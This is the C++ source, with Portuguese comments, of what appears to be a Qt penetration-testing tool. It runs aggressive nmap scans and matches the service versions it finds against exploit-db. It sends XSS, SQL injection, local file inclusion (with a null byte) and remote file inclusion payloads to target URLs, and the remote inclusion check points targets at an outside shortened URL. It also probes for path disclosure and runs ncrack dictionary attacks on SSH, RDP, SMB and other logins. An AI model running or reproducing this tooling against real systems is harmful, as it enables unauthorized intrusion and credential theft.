#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "dialog.h"

MainWindow::~MainWindow()
{
    delete ui;
}


MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow) 
{

    ui->setupUi(this);

    setWindowFlags(Qt::Window | Qt::WindowTitleHint |
                   Qt::MSWindowsFixedSizeDialogHint |
                   Qt::WindowCloseButtonHint); // impossivel de redimensionar

    //definicoes painel web

    QString path = QCoreApplication::applicationDirPath() + "/";

    QFile ini(path+"settings.ini");

   if(!ini.exists())
   {
    QMessageBox::StandardButton resposta = QMessageBox::information(this,"Definições","O ficheiro de definições do painel web não existe. Gostaria de configurar agora?",
                              QMessageBox::Yes|QMessageBox::No);
     if (resposta == QMessageBox::Yes) {
        openDialog();
      }
   }


    //instancia menuBar

    createMenus();

    //SQLi tab
    ui->lineEdit_5->setEnabled(false);
    ui->progressBar->setValue(0);


    //xss tab
    //ui->webView->setHtml("<html>Isto é uma página em HTML<br>Teste de XSS</html>");


    //tabela nmap
    ui->tableWidget->setColumnCount(5);

    QStringList header;
    header <<"Porta"<<"Serviço"<<"Software"<<"Versão"<<"Vuln";
    ui->tableWidget->setHorizontalHeaderLabels(header);
    ui->tableWidget->verticalHeader()->setVisible(false);
    ui->tableWidget->setShowGrid(false);
    ui->tableWidget->setHorizontalScrollBarPolicy(Qt::ScrollBarAlwaysOff);
    //ui->tableWidget->resizeColumnsToContents();
    ui->tableWidget->resizeRowsToContents();

}


void MainWindow::openDialog()
{
    Dialog dialog;
    dialog.exec();
}

void MainWindow::createMenus()
 {

    // configMenu = menuBar()->addMenu(tr("&Config"));
     //exitMenu = menuBar()->addMenu(tr("Sair"));

    QAction *configAction = new QAction( tr("&Config"), this );
    QAction *exitAction = new QAction( tr("&Sair"), this );

    connect( configAction, SIGNAL(triggered()), SLOT(openDialog()) );
    connect( exitAction, SIGNAL(triggered()), qApp, SLOT(closeAllWindows()) );

    ui->menuBar->addAction( configAction );
    ui->menuBar->addAction( exitAction );

}



void MainWindow::reverseIP(QString ip)
{
    QEventLoop loop;

    QNetworkAccessManager manager;
    connect(&manager, SIGNAL(finished(QNetworkReply*)), &loop, SLOT(quit()));

    QNetworkRequest req( QUrl( QString("http://api.hackertarget.com/reverseiplookup/?q="+ip) ) );

    QNetworkReply *resposta = manager.get(req);
    loop.exec();

    if (resposta->error() == QNetworkReply::NoError) {
        //qDebug() << "leitura" <<resposta->readAll();
        ui->textEdit_2->setPlainText(resposta->readAll());
        delete resposta;

        int nrsites = ui->textEdit_2->document()->blockCount();
        ui->label_8->setText(QString::number(nrsites-1) + " websites hospedados");
    }
    else {
        QMessageBox::critical(this,"Erro",resposta->errorString());
        delete resposta;
    }



}


void MainWindow::whois(QString ip)
{
    QEventLoop loop;

    QNetworkRequest req( QUrl( QString("http://api.hackertarget.com/whois/?q="+ip) ) );

    QNetworkAccessManager manager;
    connect(&manager, SIGNAL(finished(QNetworkReply*)), &loop, SLOT(quit()));

    QNetworkReply *resposta = manager.get(req);
    loop.exec();

    if (resposta->error() == QNetworkReply::NoError) {
        //qDebug() << "leitura" <<resposta->readAll();
        ui->textEdit_3->setPlainText(resposta->readAll());
        delete resposta;
    }
    else {
        QMessageBox::critical(this,"Erro",resposta->errorString());
        delete resposta;
    }

}


void MainWindow::on_pushButton_clicked() //scan ip
{
    ui->textBrowser->clear();
    ui->textEdit_2->clear();
    ui->textEdit_3->clear();
    ui->label_8->clear();
    ui->tableWidget->setRowCount(0);
    ui->textBrowser->insertPlainText("A inicializar no diretório " +  QApplication::applicationDirPath() + "/nmap/");


    QString ip = ui->lineEdit->text();

    if(ip.isEmpty())
    {
        QMessageBox::critical(this,"Erro", "Por favor introduza um endereço IP ou domínio válido!");
    }else{

        if(!ip.contains("192.168")){
            reverseIP(ip);
            whois(ip);
        }


    QString nmapdir = QApplication::applicationDirPath() + "/nmap/";
    QString arguments = "nmap --open -sS -A -T4 -sV -O -vv -Pn -oX "+nmapdir+"scan.xml " + ip;

    scanprocess = new QProcess(this);
    connect(scanprocess, SIGNAL(readyReadStandardOutput()), this, SLOT(scanoutput()));
    connect(scanprocess, SIGNAL(finished(int , QProcess::ExitStatus )), this, SLOT(scanfinished()));

    //process->setReadChannel(QProcess::StandardOutput);
    scanprocess->start(nmapdir+arguments);

    }

}


void MainWindow::scanoutput()
{
    ui->textBrowser->insertPlainText(scanprocess->readAllStandardOutput()); //nmap output
}


void MainWindow::on_pushButton_3_clicked() //ler xml
{
    QDomDocument documento;
    QFile ficheiro(QApplication::applicationDirPath() + "/nmap/scan.xml");

    //QMessageBox::information(this,"teste", QApplication::applicationDirPath() + "/scan.xml");
    if(!ficheiro.open(QIODevice::ReadOnly | QIODevice::Text))
    {
        QMessageBox::critical(this,"Erro de leitura","Erro ao abrir o ficheiro XML");
    }
    else
    {
        if(!documento.setContent(&ficheiro))
        {
            QMessageBox::critical(this,"Erro de análise","Erro ao analisar a informação do ficheiro XML");
        }
        ficheiro.close();
    }

    QDomElement raiz = documento.firstChildElement();


    xmlRead(raiz,"port","portid",0);
    xmlRead(raiz,"service","name",1);
    xmlRead(raiz,"service","product",2);
    xmlRead(raiz,"service","version",3);

    exploit();

    ui->tableWidget->resizeRowsToContents(); //remover espaço entre linhas

}

void MainWindow::exploit()
{
    int linhas = ui->tableWidget->rowCount();
     QString ip = QUrl::toPercentEncoding(ui->lineEdit->text());

    /*
    //QPixmap redimensionar = found.scaled(17,17, Qt::IgnoreAspectRatio, Qt::SmoothTransformation);
    //icon x
    QPixmap notfound(QApplication::applicationDirPath() + "/notfound.png");
    QLabel *vermelho = new QLabel;
    vermelho->setPixmap(notfound);
    vermelho->setAlignment(Qt::AlignCenter);
    //ui->tableWidget->setCellWidget(i, 4, vermelho);

    //icon y
    QPixmap found(QApplication::applicationDirPath() + "/found.png");
    QLabel *verde = new QLabel;
    verde->setPixmap(found);
    verde->setAlignment(Qt::AlignCenter);
    //ui->tableWidget->setCellWidget(0, 4, verde);
    */

    QWebView *pesquisa = new QWebView; //instancia o "browser"
    QString isvuln;

    for(int i=0;i < linhas;i++)
    {
        QString produto = QUrl::toPercentEncoding(ui->tableWidget->item(i,2)->text());
        QString versao = QUrl::toPercentEncoding(ui->tableWidget->item(i,3)->text());
        QString software = produto+" "+versao;
        QString porta = QUrl::toPercentEncoding(ui->tableWidget->item(i,0)->text());
        QString servico = QUrl::toPercentEncoding(ui->tableWidget->item(i,1)->text());

        /*
        if(versao.isEmpty())
        {
            ui->tableWidget->setItem(i,4,new QTableWidgetItem("Não"));
            //qDebug() << produto + " " +versao;
            continue;
        }
        */

        if(!produto.isEmpty() && !versao.isEmpty()){



        pesquisa->load(QUrl("http://www.exploit-db.com/search/?action=search&filter_description="+produto+"%20"+versao));

        //qDebug() << "http://www.exploit-db.com/search/?action=search&filter_description="+produto+"%20"+versao;



        QTime delay = QTime::currentTime().addSecs(3);
        while( QTime::currentTime() < delay )
        QCoreApplication::processEvents(QEventLoop::AllEvents, 100);


        if(pesquisa->page()->mainFrame()->toHtml().contains("No results"))
        {
            ui->tableWidget->setItem(i,4,new QTableWidgetItem("Não"));

        }else{
            ui->tableWidget->setItem(i,4,new QTableWidgetItem("Sim"));

        }


        }else{

            ui->tableWidget->setItem(i,4,new QTableWidgetItem("Não"));


        }


        if(ui->tableWidget->item(i,4)->text() == "Sim")
        {
            isvuln="1";
        }else{
            isvuln="0";
        }
        QString path = QCoreApplication::applicationDirPath() + "/";
        QSettings settings(path+"settings.ini", QSettings::IniFormat);
        QString webhost = settings.value("host").toString();
        QString webtoken = settings.value("token").toString();


        QWebView *addsql = new QWebView; //instancia o pedido http GET
        QUrl url = "http://"+webhost+"/vulndb/includes/add.php?add&token="+webtoken+"&tabela=scans&host="+ip+"&porta="+porta+"&software="+software+"&servico="+servico+"&vuln="+isvuln;
        addsql->load(url);

        //qDebug() << isvuln << url;
    }
}




void MainWindow::xmlRead(QDomElement raiz, QString tag, QString atributo, int coluna)
{

        QDomNodeList items = raiz.elementsByTagName(tag);

        int total = items.count();

        ui->tableWidget->setRowCount(total);

        for(int i=0;i < total;i++)
        {
            QDomNode itemnode = items.at(i);

            if(itemnode.isElement())
            {
                QDomElement itemele = itemnode.toElement();
                //QMessageBox::information(this,"info",itemele.attribute(atributo));
                ui->tableWidget->setItem(i,coluna,new QTableWidgetItem(itemele.attribute(atributo)));
            }
        }

}


void MainWindow::scanfinished()
{
        on_pushButton_3_clicked(); //load xml -> table
        ui->tableWidget->resizeRowsToContents(); //remover espaço entre linhas

        QMessageBox::information(this,"Scan concluído","O scan foi concluído com sucesso!");

}


void MainWindow::on_pushButton_2_clicked() //xss tab
{
    QString url = ui->lineEdit_2->text();
    QString url2 = QUrl::toPercentEncoding(ui->lineEdit_2->text());
    QString payload = QUrl::toPercentEncoding(ui->comboBox->currentText());
    QWebView *addsql = new QWebView; //instancia o pedido http GET
    QString path = QCoreApplication::applicationDirPath() + "/";
    QSettings settings(path+"settings.ini", QSettings::IniFormat);
    QString webhost = settings.value("host").toString();
    QString webtoken = settings.value("token").toString();

    if(url.isEmpty() || !url.contains("http")){
        QMessageBox::critical(this,"Erro","Por favor introduza um URL válido\nPrefixo 'http' em falta");
    }else{
        ui->webView->load(QUrl(url + ui->comboBox->currentText())); //load url + payload (HTTP GET)

        QTime delay = QTime::currentTime().addSecs(3);
        while( QTime::currentTime() < delay )
        QCoreApplication::processEvents(QEventLoop::AllEvents, 100);

        if(ui->webView->page()->mainFrame()->toHtml().contains("Jbqdvv") ||
           ui->webView->page()->mainFrame()->toHtml().contains(ui->comboBox->currentText()) ||
           ui->webView->page()->mainFrame()->toHtml().contains("xssed") ||
           ui->webView->page()->mainFrame()->toHtml().contains("HTML_INJECTION") ||
           ui->webView->page()->mainFrame()->toHtml().contains("String.fromCharCode") ||
           ui->webView->page()->mainFrame()->toHtml().contains("ha.ckers.org"))

        {
            QMessageBox::information(this,"Resultado", "Website possivelmente vulnerável a injeção de código HTML e JavaScript!");

            QUrl url = "http://"+webhost+"/vulndb/includes/add.php?add&token="+webtoken+"&tabela=xss&url="+url2+"&payload="+payload+"&vuln=1";
            addsql->load(url);

        }else{
            QMessageBox::information(this,"Resultado", "Website não vulnerável a injeção de código HTML e JavaScript");
            QUrl url = "http://"+webhost+"/vulndb/includes/add.php?add&token="+webtoken+"&tabela=xss&url="+url2+"&payload="+payload+"&vuln=0";
            addsql->load(url);
        }
    }
}


void MainWindow::on_comboBox_3_currentIndexChanged(int index) //method
{
    if(index == 1){
        ui->lineEdit_5->setEnabled(true);
    }else{
        ui->lineEdit_5->setEnabled(false);
        ui->lineEdit_5->clear();
    }
}


void MainWindow::on_pushButton_5_clicked() //sql tab
{

    ui->progressBar->setValue(0);
    QString path = QCoreApplication::applicationDirPath() + "/";
    QSettings settings(path+"settings.ini", QSettings::IniFormat);
    QString webhost = settings.value("host").toString();
    QString webtoken = settings.value("token").toString();

    if(!ui->lineEdit_4->text().contains("http"))
    {
        QMessageBox::critical(this,"Erro","Por favor introduza um URL válido\nPrefixo 'http' em falta");
    }else if(ui->comboBox_3->currentIndex() == 1 && ui->lineEdit_5->text().isEmpty())
    {
        QMessageBox::critical(this,"Erro","Por favor introduza as variáveis no campo POST!");
    }else{
        //sqli scan
        QWebView *addsql = new QWebView; //instancia o pedido http GET
        QString url = ui->lineEdit_4->text();
        QString metodo = ui->comboBox_3->currentText();
        QString postdata2 = QUrl::toPercentEncoding(ui->lineEdit_5->text());

        QFile ficheiro(QApplication::applicationDirPath() + "/strings.txt");
        QStringList strings;
        int numlinhas=0;
        if (ficheiro.open(QIODevice::ReadOnly | QIODevice::Text))
        {
            QTextStream input(&ficheiro);
            while (!input.atEnd()) {
                strings += input.readLine();
                numlinhas++;
        }


         QFile ficheiro2(QApplication::applicationDirPath() + "/erros.txt");
         QStringList erros;
         int totallinhas=0;
         if (ficheiro2.open(QIODevice::ReadOnly | QIODevice::Text))
         {
            QTextStream in(&ficheiro2);
            while (!in.atEnd())
            {
                erros += in.readLine();
                totallinhas++;
            }



        }

        QNetworkRequest request(url);
        request.setHeader(QNetworkRequest::ContentTypeHeader, QVariant("application/x-www-form-urlencoded"));

        for(int i=0;i < numlinhas;i++)
        {
            QByteArray postdata; postdata.append(ui->lineEdit_5->text() + strings[i]);


            if(ui->comboBox_3->currentIndex() == 0){
                ui->webView_3->load(url+strings[i]);
            }else if(ui->comboBox_3->currentIndex() == 1){

                ui->webView_3->load(request,QNetworkAccessManager::PostOperation, postdata);
            }


             // qDebug() << url+strings[i];
               ui->progressBar->setValue(i*(100/numlinhas));

            QTime delay = QTime::currentTime().addSecs(3);
            while( QTime::currentTime() < delay )
            QCoreApplication::processEvents(QEventLoop::AllEvents, 100);

            for(int j=0;j< totallinhas;j++)
            {
                qDebug() << erros[j];
            if(ui->webView_3->page()->mainFrame()->toHtml().contains(erros[j]))
            {

              ui->progressBar->setValue(100);
              QMessageBox::information(this,"Resultado","Website possivelmente vulnerável a injeção de código SQL!");

              QUrl url2 = "http://"+webhost+"/vulndb/includes/add.php?add&tabela=sqli&token="+webtoken+"&url="+url+"&metodo="+metodo+"&postdata="+postdata2+"&vuln=1";
              addsql->load(url2);

              return;
            }


            }
        //return;

        }
        ui->progressBar->setValue(100);
        QMessageBox::information(this,"Resultado","Website não vulnerável a injeção de código SQL");

        QUrl url2 = "http://"+webhost+"/vulndb/includes/add.php?add&tabela=sqli&token="+webtoken+"&url="+url+"&metodo="+metodo+"&postdata="+postdata2+"&vuln=0";
        addsql->load(url2);
    }
}
}


void MainWindow::on_webView_urlChanged()
{
    //ui->lineEdit_2->setText(ui->webView->url().toString());
}

void MainWindow::on_webView_3_urlChanged()
{
    //ui->lineEdit_4->setText(ui->webView_3->url().toString());
}

void MainWindow::on_pushButton_4_clicked()
{
    QString path = QCoreApplication::applicationDirPath() + "/";
    QSettings settings(path+"settings.ini", QSettings::IniFormat);
    QWebView *addsql = new QWebView; //instancia o pedido http GET
    QString webhost = settings.value("host").toString();
    QString webtoken = settings.value("token").toString();

    if(!ui->lineEdit_6->text().contains("http"))
    {
        QMessageBox::critical(this,"Erro","Por favor introduza um URL válido\nPrefixo 'http' em falta");

    }else
    {
        QString link = ui->lineEdit_6->text();
        QString payload = ui->comboBox_2->currentText();

        QString link2 = QUrl::toPercentEncoding(link);
        QString payload2 = QUrl::toPercentEncoding(payload);

        QString nullbyte = "%00";


        if(ui->checkBox->isChecked())
        {
            ui->webView_2->load(QUrl(link + payload + nullbyte));
        }else{
            ui->webView_2->load(QUrl(link + payload));
        }


        QTime delay = QTime::currentTime().addSecs(3);
        while( QTime::currentTime() < delay )
        QCoreApplication::processEvents(QEventLoop::AllEvents, 100);

        if(ui->webView_2->page()->mainFrame()->toHtml().contains("include()") ||
           ui->webView_2->page()->mainFrame()->toHtml().contains("failed to open stream") ||
           ui->webView_2->page()->mainFrame()->toHtml().contains("Failed opening") ||
           ui->webView_2->page()->mainFrame()->toHtml().contains("include_once()") ||
           ui->webView_2->page()->mainFrame()->toHtml().contains("require_once()") ||
           ui->webView_2->page()->mainFrame()->toHtml().contains("/bin/bash") ||
           ui->webView_2->page()->mainFrame()->toHtml().contains("HTTP_USER_AGENT") ||
           ui->webView_2->page()->mainFrame()->toHtml().contains("root") ||
           ui->webView_2->page()->mainFrame()->toHtml().contains("for 16-bit app support") ||
           ui->webView_2->page()->mainFrame()->toHtml().contains("I love PHP") ||
           ui->webView_2->page()->mainFrame()->toHtml().contains("allow_url_fopen") ||
           ui->webView_2->page()->mainFrame()->toHtml().contains("allow_url_include") ||
           ui->webView_2->page()->mainFrame()->toHtml().contains("HTTP/1.1") ||
           ui->webView_2->page()->mainFrame()->toHtml().contains("require()"))

        {
            QMessageBox::information(this,"Resultado", "Website possivelmente vulnerável a inclusão de ficheiros!");

            QUrl urlx = "http://"+webhost+"/vulndb/includes/add.php?add&tabela=inc_fich&token="+webtoken+"&url="+link2+"&tipo=LFI&payload="+payload2+"&vuln=1";
            addsql->load(urlx);

        }else{
            QMessageBox::information(this,"Resultado", "Website não vulnerável a inclusão de ficheiros");
            QUrl urly = "http://"+webhost+"/vulndb/includes/add.php?add&tabela=inc_fich&token="+webtoken+"&url="+link2+"&tipo=LFI&payload="+payload2+"&vuln=0";
            addsql->load(urly);
        }

    }

}



void MainWindow::on_webView_2_urlChanged()
{
    //ui->lineEdit_6->setText(ui->webView_2->url().toString());

}

void MainWindow::on_pushButton_7_clicked() //dnsZT
{

    ui->textEdit->clear();
    QEventLoop loop;

    QNetworkRequest req( QUrl( QString("http://api.hackertarget.com/zonetransfer/?q="+ui->lineEdit_8->text())));

    QNetworkAccessManager manager;
    connect(&manager, SIGNAL(finished(QNetworkReply*)), &loop, SLOT(quit()));

    QNetworkReply *resposta = manager.get(req);
    loop.exec();

    if (resposta->error() == QNetworkReply::NoError) {
        //qDebug() << "leitura" <<resposta->readAll();
        ui->textEdit->setPlainText(resposta->readAll());
        delete resposta;
    }
    else {
        QMessageBox::critical(this,"Erro",resposta->errorString());
        delete resposta;
    }
}

void MainWindow::on_pushButton_6_clicked()
{
    QWebView *addsql = new QWebView; //instancia o pedido http GET
    QString path = QCoreApplication::applicationDirPath() + "/";
    QSettings settings(path+"settings.ini", QSettings::IniFormat);
    QString webhost = settings.value("host").toString();
    QString webtoken = settings.value("token").toString();

    if(!ui->lineEdit_7->text().contains("http"))
    {
        QMessageBox::critical(this,"Erro","Por favor introduza um URL válido\nPrefixo 'http' em falta");

    }else
    {
        QString url = ui->lineEdit_7->text();
        QString payload = ui->lineEdit_3->text();

        //QString nullbyte = "%00";

        /*
         if(ui->checkBox->isChecked())
        {
            ui->webView_2->load(QUrl(link + payload + nullbyte));
        }else{
            ui->webView_2->load(QUrl(link + payload));
        }
        */

        QUrl link = url + "http://goo.gl/OiWwa0&x=" + payload;

        ui->webView_4->load(link);

        QString urllink = QUrl::toPercentEncoding(url);
        QString payload2 = QUrl::toPercentEncoding(payload);

        QTime delay = QTime::currentTime().addSecs(3);
        while( QTime::currentTime() < delay )
        QCoreApplication::processEvents(QEventLoop::AllEvents, 100);

        if(ui->webView_4->page()->mainFrame()->toHtml().contains("phpinfo()"))

        {
            QMessageBox::information(this,"Resultado", "Website possivelmente vulnerável a inclusão de ficheiros remotos!");

            QUrl url2 = "http://"+webhost+"/vulndb/includes/add.php?add&tabela=inc_fich&token="+webtoken+"&url="+urllink+"&tipo=RFI&payload="+payload2+"&vuln=1";
            addsql->load(url2);
        }

    }

}



void MainWindow::on_pushButton_8_clicked() //fpd
{
    QWebView *addsql = new QWebView; //instancia o pedido http GET
    QString path = QCoreApplication::applicationDirPath() + "/";
    QSettings settings(path+"settings.ini", QSettings::IniFormat);
    QString webhost = settings.value("host").toString();
    QString webtoken = settings.value("token").toString();

    if(!ui->lineEdit_9->text().contains("http"))
    {
        QMessageBox::critical(this,"Erro","Por favor introduza um URL válido\nPrefixo 'http' em falta");

    }else
    {

        QString url = ui->lineEdit_9->text();
        QString url2 = QUrl::toPercentEncoding(url);
        QString payload = QUrl::toPercentEncoding(ui->comboBox_4->currentText());
        QString urlarray = ui->lineEdit_9->text();
        QString subStr = "=";
        QString novaStr = "[]=";
        QByteArray cookie;
        urlarray.replace(urlarray.indexOf(subStr), subStr.size(), novaStr);

        QNetworkRequest request(url);

        if(ui->comboBox_4->currentIndex() == 1){
            cookie = "PHPSESSID=";
        }else if(ui->comboBox_4->currentIndex() == 2){
            cookie = "PHPSESSID=.";
        }else if(ui->comboBox_4->currentIndex() == 3){
            cookie = "PHPSESSID=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        }

        request.setRawHeader("Cookie", cookie);
        ui->webView_5->load(request);


        if(ui->comboBox_4->currentIndex() == 0){
            ui->webView_5->load(urlarray);
        }


        QTime delay = QTime::currentTime().addSecs(3);
        while( QTime::currentTime() < delay )
        QCoreApplication::processEvents(QEventLoop::AllEvents, 100);


        if(ui->webView_5->page()->mainFrame()->toHtml().contains("Warning:") ||
           //ui->webView_5->page()->mainFrame()->toHtml().contains("array") ||
           ui->webView_5->page()->mainFrame()->toHtml().contains("failed to open dir") ||
          // ui->webView_5->page()->mainFrame()->toHtml().contains("[]") ||
           ui->webView_5->page()->mainFrame()->toHtml().contains("on line") ||
           ui->webView_5->page()->mainFrame()->toHtml().contains("opendir") ||
           ui->webView_5->page()->mainFrame()->toHtml().contains("session_start") ||
           ui->webView_5->page()->mainFrame()->toHtml().contains("illegal characters") ||
           ui->webView_5->page()->mainFrame()->toHtml().contains("supplied argument"))

        {
            QMessageBox::information(this,"Resultado", "Website possivelmente vulnerável a revelação de diretório!");
            QUrl urly = "http://"+webhost+"/vulndb/includes/add.php?add&tabela=fpd&token="+webtoken+"&url="+url2+"&payload="+payload+"&vuln=1";
            addsql->load(urly);
        }else{
            QMessageBox::information(this,"Resultado", "Website não vulnerável a revelação de diretório!");
            QUrl urlx = "http://"+webhost+"/vulndb/includes/add.php?add&tabela=fpd&token="+webtoken+"&url="+url2+"&payload="+payload+"&vuln=0";
            addsql->load(urlx);
        }

        ui->webView_5->page()->networkAccessManager()->setCookieJar(new QNetworkCookieJar());
    }
}

void MainWindow::on_pushButton_9_clicked() //crack
{
    ui->textEdit_4->clear();

    QString host = ui->lineEdit_10->text();
    QString porta = ui->lineEdit_11->text();
    QString proto = ui->comboBox_5->currentText();

    if(host.isEmpty())
    {
        QMessageBox::critical(this,"Erro", "Por favor introduza um endereço IP ou domínio válido!");
    }else if(porta.isEmpty())
    {
        QMessageBox::critical(this,"Erro", "Por favor introduza uma porta válida!");
    }else{

        QString ncrackdir = QApplication::applicationDirPath() + "/ncrack/";
       QString arguments = "ncrack -v -T5 -U usr.txt -P pwd.txt "+proto+"://"+host+":"+porta;

        //qDebug() << ncrackdir+arguments;


        crackprocess = new QProcess(this);
        connect(crackprocess, SIGNAL(readyReadStandardOutput()), this, SLOT(crackoutput()));
        connect(crackprocess, SIGNAL(finished(int , QProcess::ExitStatus )), this, SLOT(crackfinished()));

        //crackprocess->setReadChannel(QProcess::StandardOutput);
        crackprocess->start(ncrackdir+arguments);

        }
}

void MainWindow::crackoutput()
{
     ui->textEdit_4->insertPlainText(crackprocess->readAllStandardOutput());
}

void MainWindow::crackfinished()
{
    QMessageBox::information(this,"Ataque concluído","O ataque com dicionário foi concluído com sucesso!");
}



void MainWindow::on_pushButton_10_clicked()
{
    if(ui->textEdit_4->toPlainText().isEmpty())
    {
        QMessageBox::critical(this,"Erro","Não existe nenhuma informação para ser guardada em ficheiro.");
    }else{
        /*
    QString ficheiro = QFileDialog::getSaveFileName();
    QFile f( ficheiro );
    f.open( QIODevice::WriteOnly );
    f = ui->textEdit_4->toPlainText();
    f.close();
    }
    */
    }
}


void MainWindow::on_comboBox_5_currentIndexChanged(int index)
{
    if(index == 0){
        ui->lineEdit_11->setText("21");
    }else if(index == 1){
        ui->lineEdit_11->setText("22");
    }else if(index == 2){
        ui->lineEdit_11->setText("23");
    }else if(index == 3){
        ui->lineEdit_11->setText("80");
    }else if(index == 4){
        ui->lineEdit_11->setText("445");
    }else if(index == 5){
        ui->lineEdit_11->setText("3389");
    }else if(index == 6){
        ui->lineEdit_11->setText("5900");
    }else if(index == 7){
        ui->lineEdit_11->setText("110");
    }
}
